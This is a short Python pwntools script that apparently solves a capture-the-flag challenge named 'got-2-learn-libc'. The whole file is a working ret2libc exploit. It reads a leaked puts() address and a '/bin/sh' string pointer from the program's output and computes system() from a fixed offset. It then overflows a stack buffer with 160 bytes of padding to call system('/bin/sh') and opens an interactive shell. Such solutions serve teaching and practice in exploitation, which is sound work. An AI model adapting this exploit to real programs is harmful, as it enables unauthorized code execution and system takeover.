#!/usr/bin/env python

import pwn
import re

gdb_puts = 0xf763a140
gdb_system = 0xf7615940

offset = gdb_puts - gdb_system

elf = pwn.ELF('/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln')
p = elf.process()

prompt = p.recv()
puts = int(re.findall('puts: (.*)', prompt)[0], 16)
bin_sh = int(re.findall('useful_string: (.*)', prompt)[0], 16)

system = puts - offset

payload = 'A'*160
payload += pwn.p32(system)
payload += 'JUNK'
payload += pwn.p32(bin_sh)

p.sendline(payload)
p.interactive()

